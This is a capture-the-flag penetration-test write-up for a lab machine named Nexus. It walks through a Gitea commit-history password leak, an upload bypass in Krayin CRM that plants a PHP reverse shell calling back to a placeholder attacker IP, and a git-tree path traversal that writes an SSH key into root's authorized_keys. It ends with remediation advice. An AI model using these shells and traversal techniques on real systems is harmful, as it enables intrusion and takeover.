# Write-Up — Nexus: Gitea Credential Leak to Krayin CRM RCE to Root via Template Sync Path Traversal

> **Type:** Web Application / Linux Penetration Test (HTB, Easy)
> **Target:** `10.129.65.36` (`nexus.htb`)
> **Tools:** Nmap, ffuf, Gitea, Burp Suite, netcat, ssh-keygen, custom Python (git object crafting)
> **Final Result:** Root access via a chain of exposed Gitea credentials → Krayin CRM RCE (CVE-2026-38526) → SSH as a local user → directory traversal in a Gitea template-sync script writing an SSH key to `/root/.ssh/authorized_keys`

---

## 1. Introduction

The target is an easy-difficulty Linux machine presenting itself as a government energy authority website, with a self-hosted Gitea instance and a Krayin CRM deployment hidden behind virtual hosts. The objective was to enumerate hidden subdomains, recover leaked credentials from source control history, exploit a CRM vulnerability for a web shell, and escalate to root by abusing an automated Gitea template-synchronization service.

This box demonstrates a realistic, multi-service chain built almost entirely from information disclosure and logic flaws rather than memory-corruption exploits:

- **Virtual host enumeration** revealing hidden subdomains (`git`, `billing`) not linked from the public site.
- **Secrets left in Git commit history** — a password removed from a later commit but still recoverable from an earlier one.
- **CVE-2026-38526** — an arbitrary file upload / RCE vulnerability in Krayin CRM's mail attachment handling.
- **Credential reuse** between the CRM's database config and a real system/Gitea account.
- **Unsanitized `os.path.join()` on git-derived paths** in a custom template-sync script, enabling directory traversal and arbitrary file write as `root`.

---

## 2. Reconnaissance

### 2.1 Full Port Scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.65.36 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.65.36
```

Result:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.15) |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

The HTTP service did not follow its redirect target automatically, pointing instead to `http://nexus.htb/` — indicating name-based virtual hosting.

### 2.2 Adding the Hostname

```bash
echo "10.129.65.36 nexus.htb" | sudo tee -a /etc/hosts
```

Visiting the site displayed a government-styled "Nexus Energy Authority" landing page, including a **Careers** section listing an "Operations Specialist – Customer Platforms" role. That posting disclosed two email addresses: `careers@nexus.htb` and, notably, a named hiring manager at `j.matthew@nexus.htb` — a valid username/email to keep in mind for later credential testing.

---

## 3. Subdomain Enumeration

With no further functionality on the landing page itself, virtual host fuzzing was the next step.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb"
```

Several hosts returned an identical-looking response (`support`, `host`, `test`), indicating a wildcard/default vhost response that needed filtering out by word count:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
```

This isolated two genuine subdomains:

```
git      [Status: 200]
billing  [Status: 302]
```

---

## 4. Gitea Enumeration and Credential Recovery

### 4.1 Discovering the Gitea Instance

Adding `git.nexus.htb` to `/etc/hosts` and browsing revealed a self-hosted **Gitea** instance. Browsing its public repositories surfaced a project named `krayin-docker-setup`, containing a committed **`.env`** file.

### 4.2 Reviewing the Current `.env`

The current version of the file confirmed the `billing.nexus.htb` vhost (matching the earlier ffuf discovery) as the `APP_URL`, along with database configuration referencing a `krayin` database — but with the `DB_PASSWORD` field blank in the latest commit.

### 4.3 Recovering the Password from Commit History

Reviewing the repository's commit history revealed an **earlier commit** where the password had not yet been redacted:

```
DB_PASSWORD=N27xh!!2ucY04
```

This is a common and easily overlooked mistake: removing a secret in a later commit does not remove it from version control history — it remains fully retrievable by anyone who can browse or clone the repository.

---

## 5. Vulnerability Analysis — Krayin CRM (CVE-2026-38526)

### 5.1 Accessing the Application

```bash
echo "10.129.65.36 billing.nexus.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://billing.nexus.htb` presented a **Krayin CRM** login page. Using the previously discovered hiring manager email (`j.matthew@nexus.htb`) alongside the recovered password succeeded, confirming credential reuse between the leaked database secret and an actual application account. The CRM's admin panel additionally disclosed its version: **2.2.0**.

### 5.2 Identifying the Vulnerability

A search for known issues affecting Krayin CRM 2.2.0 identified **CVE-2026-38526**, along with a public proof-of-concept describing exploitation via the application's mail/attachment-upload functionality.

- **CVE:** CVE-2026-38526
- **Type:** Arbitrary file upload leading to remote code execution
- **Authentication:** Valid CRM credentials required
- **Impact:** Arbitrary PHP file execution in the context of the web server process

---

## 6. Initial Access — Web Shell via Krayin CRM

### 6.1 Preparing the Payload

A standard PHP reverse shell (pentestmonkey-style) was edited to point at the attacking host and chosen listener port:

```php
$ip = '<ATTACKER_IP>';   // CHANGE THIS
$port = 4455;            // CHANGE THIS
```

### 6.2 Uploading via the Mail Compose Feature

Within Krayin CRM, a new email was composed, and the PHP reverse shell was attached as a file. The upload request was intercepted with Burp Suite before it completed.

### 6.3 Bypassing the File-Type Restriction

The intercepted multipart request initially labeled the upload as `image/png`. Per the CVE-2026-38526 technique, the request was forwarded with the filename and content type modified so the file was stored and interpreted as **`.php`** rather than `.png`, defeating the client-side/naive extension check.

The server's JSON response confirmed the stored file location:

```
"location":"http://billing.nexus.htb/storage/tinymce/<generated_filename>.php"
```

### 6.4 Triggering the Shell

A netcat listener was started:

```bash
nc -lnvp 4455
```

Then the uploaded file was requested directly in the browser:

```
http://billing.nexus.htb/storage/tinymce/<generated_filename>.php
```

The listener caught a connection as **`www-data`**:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgraded to a more usable shell:

```bash
script /dev/null -c /bin/bash
```

> **Severity: Critical.** An authenticated file-upload endpoint failed to enforce server-side content-type/extension validation, allowing direct PHP code execution.

---

## 7. Lateral Movement — SSH Foothold

### 7.1 Recovering Application Database Credentials

```bash
cat ~/krayin/.env
```

```
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

(Note: distinct from the earlier Gitea-recovered password — this is the CRM's live production credential.)

### 7.2 Identifying Local User Accounts

```bash
cat /etc/passwd
```

Revealed a real interactive user: **`jones`**.

### 7.3 Testing Credential Reuse via SSH

```bash
ssh jones@10.129.65.36
```

The recovered CRM database password was valid for `jones`'s SSH login as well, providing a proper user shell.

### 7.4 User Flag

```bash
cat /home/jones/user.txt
```

This returned the user flag.

---

## 8. Privilege Escalation — Gitea Template Sync Directory Traversal

### 8.1 Discovering the Scheduled Service

```bash
systemctl list-timers
```

```
NEXT                         LEFT    UNIT                        ACTIVATES
Thu 2026-03-05 18:02:00 UTC  1min    gitea-template-sync.timer   gitea-template-sync.service
```

A systemd timer was found triggering a template-synchronization job every couple of minutes.

### 8.2 Reviewing the Sync Script

Reading `/etc/gitea/template-sync.py` revealed that it:

1. Clones every Gitea repository marked as a **template**.
2. Walks each repository's tree via `git ls-tree`.
3. Writes each listed file into a staging path using:

```python
target = os.path.join(stage_path, filepath)
os.makedirs(os.path.dirname(target), exist_ok=True)
```

### 8.3 The Vulnerability

- **CVE:** N/A — application-logic flaw in a custom internal automation script
- **Type:** Path traversal via unsanitized `os.path.join()` on attacker-controlled file paths sourced from `git ls-tree`
- **Authentication:** A valid Gitea account capable of creating repositories (already obtained via `jones`)
- **Impact:** Arbitrary file write with the privileges of the service running the sync job (root, per the systemd timer)

`os.path.join()` does not sanitize `..` traversal sequences — if `filepath` contains them, the resulting `target` can resolve **outside** the intended staging directory (`/home/git/template-staging/<owner>/<repo>/`). Since the script runs as root, controlling `filepath` means controlling **where on the entire filesystem** the synced file content is written.

Ordinarily, Git's own `verify_path()` checks would reject a tree entry named `..` when committing normally through the `git` CLI or a standard push — but this restriction can be bypassed by writing **raw git objects directly** into `.git/objects/` and manually constructing tree/commit structures, sidestepping the normal path-validation logic entirely.

### 8.4 Preparing an SSH Key

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

### 8.5 Creating a Template Repository

Logged into Gitea as `jones`, a new repository named **`rce`** was created, with the **"Make repository a template"** option enabled — a requirement for the sync script to pick it up.

### 8.6 Crafting the Traversal Payload

```bash
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
touch README.md
```

A custom script (`build.py`) was used to hand-construct raw Git blob/tree/commit objects, bypassing the CLI's normal path validation:

- A blob was created holding the attacker's SSH public key.
- A `.ssh` tree entry wrapped an `authorized_keys` entry pointing to that blob.
- A `root` tree entry wrapped the `.ssh` tree.
- Four additional `..` tree levels were layered on top of that, followed by a fifth `..` entry at the repository root — enough traversal depth to escape `/home/git/template-staging/jones/rce/` and land in `/root/`.

```bash
python3 /tmp/build.py
```

```
Done: 025b473292e1fdcdb027771defd8d3d0279c709f
```

### 8.7 Pushing the Crafted Commit

```bash
git push -u origin main --force
```

### 8.8 Waiting for the Sync Timer

Monitoring confirmed the sync job executed and processed the traversal path:

```bash
cat /var/log/template-sync.log
```

```
[2026-03-05 18:04:00] Template sync starting
[2026-03-05 18:04:00] Found 2 template repo(s)
[2026-03-05 18:04:00] Syncing template: jones/rce
[2026-03-05 18:04:00] synced: README.md
[2026-03-05 18:04:00] synced: ../../../../../root/.ssh/authorized_keys
[2026-03-05 18:04:00] Template sync complete
```

The sync service wrote the crafted SSH public key directly to `/root/.ssh/authorized_keys`.

### 8.9 Root Access

```bash
ssh -i /tmp/.k root@nexus.htb
```

```
root@nexus:~#
```

### 8.10 Root Flag

```bash
ls -la /root/root.txt
```

This confirmed the final flag, completing the machine.

> **Severity: Critical.** A privileged, automated service trusted attacker-influenced file paths derived from Git tree data without sanitizing directory traversal sequences, allowing any user capable of creating a Gitea template repository to achieve arbitrary file write as root.

---

## 9. Full Attack Chain

```
[ Recon: Nmap → nexus.htb landing page ]
       │
       ▼
[ Careers page discloses hiring-manager email (j.matthew@nexus.htb) ]
       │
       ▼
[ ffuf vhost fuzzing → git.nexus.htb + billing.nexus.htb discovered ]
       │
       ▼
[ Gitea: krayin-docker-setup repo → .env password redacted in latest commit ]
       │
       ▼
[ Commit history reviewed → earlier cleartext DB_PASSWORD recovered ]
       │
       ▼
[ Krayin CRM login (j.matthew + recovered password) → version 2.2.0 confirmed ]
       │
       ▼
[ CVE-2026-38526: PHP reverse shell uploaded via mail attachment, .png→.php via Burp ]
       │
       ▼
[ Shell triggered → www-data foothold ]
       │
       ▼
[ krayin/.env → live DB_PASSWORD found → /etc/passwd → user 'jones' identified ]
       │
       ▼
[ SSH as jones (password reuse) → user.txt read ]
       │
       ▼
[ systemctl list-timers → gitea-template-sync.timer discovered ]
       │
       ▼
[ /etc/gitea/template-sync.py reviewed → unsanitized os.path.join() found ]
       │
       ▼
[ Template repo 'rce' created in Gitea, marked as template ]
       │
       ▼
[ build.py crafts raw git objects with '..' traversal tree entries ]
       │
       ▼
[ git push --force → malicious commit pushed ]
       │
       ▼
[ Sync timer fires → authorized_keys written to /root/.ssh/ ]
       │
       ▼
[ ssh -i /tmp/.k root@nexus.htb → root shell → root.txt read ]
```

**Lesson:** Every stage of this chain was an information-disclosure or logic flaw — leaked commit history, a known CVE in third-party software, password reuse, and an unsanitized path-join in an internal automation script. None of it required binary exploitation or a novel vulnerability class.

---

## 10. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | Hiring-manager email disclosed on a public careers page | **Low** | Avoid publishing individual employee emails on public pages; use role-based aliases only, and be mindful that job postings are a common OSINT/username-enumeration source. |
| 2 | Cleartext database password recoverable from Git commit history | **Critical** | Treat any committed secret as permanently compromised even after later "removal" — rotate the credential immediately, and use `git filter-repo`/BFG to purge history if a secret is committed by mistake. Use environment-based secret injection (vault, CI/CD secrets) instead of committing `.env` files at all. |
| 3 | Krayin CRM vulnerable to CVE-2026-38526 (arbitrary file upload / RCE) | **Critical** | Patch/upgrade Krayin CRM to a fixed version immediately. Enforce server-side content-type and magic-byte validation on all upload endpoints, independent of client-supplied filenames or MIME types. |
| 4 | Password reuse between the CRM's database credential and a real SSH/Gitea account | **High** | Enforce unique credentials per system and account; audit for credential reuse across application and OS-level accounts. |
| 5 | Template-sync script uses `os.path.join()` on unsanitized, attacker-influenceable file paths from `git ls-tree` | **Critical** | Validate and normalize all paths derived from repository content before use (`os.path.normpath` combined with an explicit check that the resolved path remains within the intended staging directory); never trust repository-supplied paths, especially from templates contributable by non-administrative users. |
| 6 | Privileged (root) systemd service processes content from repositories creatable by low-privileged users | **High** | Run automation services that process user-influenced content with the minimum privilege necessary — not root — and treat any repository content as untrusted input requiring full validation before filesystem operations. |

---

## 11. Conclusion

This box is a compact illustration of principles that remain highly relevant across real-world engagements:

1. **Version control history is forever unless actively purged.** Redacting a secret in a new commit is not the same as removing it — anyone with repository access can walk back through history and recover it.
2. **Known CVEs in self-hosted business applications (CRMs, ticketing systems, wikis) are a reliable source of initial access**, especially when version numbers are conveniently disclosed in the application UI itself.
3. **Automation scripts running with elevated privileges are prime privilege-escalation targets.** A single unsanitized `os.path.join()` call, reachable by any user able to create a template repository, was enough to turn a standard user account into root.

The fix, as with most findings of this class, is layered discipline: never commit secrets (and rotate them if it happens), patch known-vulnerable third-party software promptly, avoid credential reuse, and treat every path derived from user- or repository-controlled data as hostile until proven otherwise — especially in code that runs as root.
